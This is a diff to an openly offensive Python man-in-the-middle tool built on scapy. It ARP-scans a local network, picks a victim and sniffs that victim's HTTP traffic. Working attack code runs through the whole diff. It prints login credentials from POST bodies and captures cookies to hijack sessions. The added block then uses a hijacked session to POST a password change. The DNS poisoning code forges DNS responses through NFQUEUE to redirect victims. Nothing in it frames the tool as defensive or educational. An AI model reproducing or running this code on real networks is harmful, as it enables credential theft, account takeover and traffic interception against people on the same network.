@@ -11,9 +11,7 @@ import platform
 import ctypes
 import subprocess
 import requests
-import networkx as nx
-import matplotlib.pyplot as plt
-import netfilterqueue
+import re
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -34,29 +32,10 @@ parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
-class NetworkMapper:
-    def __init__(self):
-        self.graph = nx.Graph()
-
-    def add_device(self, device_ip, device_mac, device_vendor):
-        self.graph.add_node(device_ip, mac=device_mac, vendor=device_vendor)
-
-    def add_connection(self, device_ip1, device_ip2):
-        self.graph.add_edge(device_ip1, device_ip2)
-
-    def visualize(self):
-        pos = nx.spring_layout(self.graph)
-        labels = {node: node for node in self.graph.nodes()}
-        nx.draw(self.graph, pos, with_labels=True, node_size=500, node_color='skyblue', font_size=10)
-        nx.draw_networkx_labels(self.graph, pos, labels, font_size=12, font_weight='bold')
-        plt.title("Network Topology")
-        plt.show()
-
 def arp_scan(network, iface):
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                  timeout=5, iface=iface, verbose=False)
     print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
-    network_mapper = NetworkMapper()
     for i in ans:
         mac = i.answer[ARP].hwsrc
         ip = i.answer[ARP].psrc
@@ -65,19 +44,14 @@ def arp_scan(network, iface):
         except VendorNotFoundError:
             vendor = 'unrecognized device'
         print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
-        network_mapper.add_device(ip, mac, vendor)
-        
-    # After scanning, visualize the network topology
-    network_mapper.visualize()
     print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
     return input('\nPick a device IP: ')
 
 class Device:
-    def __init__(self, routerip, targetip, iface, dns_spoof_map=None):
+    def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
         self.targetip = targetip
         self.iface = iface
-        self.dns_spoof_map = dns_spoof_map or {}
 
     def mitm(self):
         while True:
@@ -117,6 +91,7 @@ class Device:
                         except Exception:
                             pass
 
+                    # Capture credentials
                     if "POST" in raw_data:
                         if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
                            any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
@@ -125,17 +100,29 @@ class Device:
                                 if '=' in line and len(line) < 100:
                                     print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-                    # Capture cookies
+                    # Capture cookies and attempt advanced hijacking
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
                         
-                        # Session hijacking attempt (basic)
+                        # Advanced session hijacking (attempting session fixation)
                         session = requests.Session()
                         session.cookies.set('session', cookies)
+                        
+                        # Attempt accessing a known target page
                         response = session.get(url)
                         print(f"{Fore.CYAN}Hijacked Session Response: {response.status_code} {url}{Style.RESET_ALL}")
                         
+                        # CSRF Attack: Example to send malicious request
+                        csrf_url = f"{url}/change-password"
+                        csrf_data = {
+                            'old_password': 'password123',
+                            'new_password': 'newpassword456',
+                            'confirm_password': 'newpassword456'
+                        }
+                        csrf_response = session.post(csrf_url, data=csrf_data)
+                        print(f"{Fore.RED}CSRF Attack Attempted: {csrf_response.status_code} {csrf_url}{Style.RESET_ALL}")
+
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
@@ -148,20 +135,17 @@ class Device:
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
-    def dns_poison(self):
+    def dns_poison(self, spoof_ip):
+        import netfilterqueue  # Import only when DNS poisoning is needed
+        
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
-                # Check if the requested domain is in our DNS spoof map
-                domain = pkt[DNS].qd.qname.decode('utf-8').strip('.')
-                if domain in self.dns_spoof_map:
-                    spoofed_ip = self.dns_spoof_map[domain]
-                    # Spoof the DNS response with the mapped IP
-                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-                    send(spoofed_pkt, iface=self.iface, verbose=False)
-                    print(f'{Fore.RED}DNS Poison: Redirected {domain} to {spoofed_ip}{Style.RESET_ALL}')
+                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
+                send(spoofed_pkt, iface=self.iface, verbose=False)
+                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
         
         # Set up NFQUEUE for DNS packets
         nfqueue = netfilterqueue.NetfilterQueue()
@@ -169,18 +153,10 @@ class Device:
         print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
         nfqueue.run()
 
-    def manipulate_routing(self, target_ip, new_gateway_ip):
-        print(f"{Fore.GREEN}Redirecting traffic from {target_ip} to {new_gateway_ip}{Style.RESET_ALL}")
-        subprocess.call(f"ip route add {target_ip} via {new_gateway_ip}", shell=True)
-    
-    def block_traffic(self, ip_to_block):
-        print(f"{Fore.RED}Blocking traffic to {ip_to_block}{Style.RESET_ALL}")
-        subprocess.call(f"iptables -A INPUT -d {ip_to_block} -j DROP", shell=True)
-
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Manipulate Routing\n6. Block Traffic\n7. Exit')
+            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
@@ -196,18 +172,10 @@ class Device:
             elif choice == 4:
                 self.arp_sniff()
             elif choice == 5:
-                target_ip = input(f'{Fore.RED}Enter target IP: {Style.RESET_ALL}')
-                new_gateway_ip = input(f'{Fore.RED}Enter new gateway IP: {Style.RESET_ALL}')
-                self.manipulate_routing(target_ip, new_gateway_ip)
-            elif choice == 6:
-                ip_to_block = input(f'{Fore.RED}Enter IP to block: {Style.RESET_ALL}')
-                self.block_traffic(ip_to_block)
-            elif choice == 7:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
             else:
-                print(f'{Fore.RED}Invalid choice!{Style.RESET_ALL}')
-                continue
+                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')
 
 if __name__ == '__main__':
     while True:
@@ -215,11 +183,7 @@ if __name__ == '__main__':
         if targetip == "0":
             print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
             break
-        dns_spoof_map = {
-            'example.com': '192.168.1.100',  # Custom DNS spoof map
-            'anotherdomain.com': '192.168.1.101'
-        }
-        device = Device(opts.routerip, targetip, opts.iface, dns_spoof_map)
+        device = Device(opts.routerip, targetip, opts.iface)
         device.enable_ip_forwarding()
         device.set_iptables()
         try:
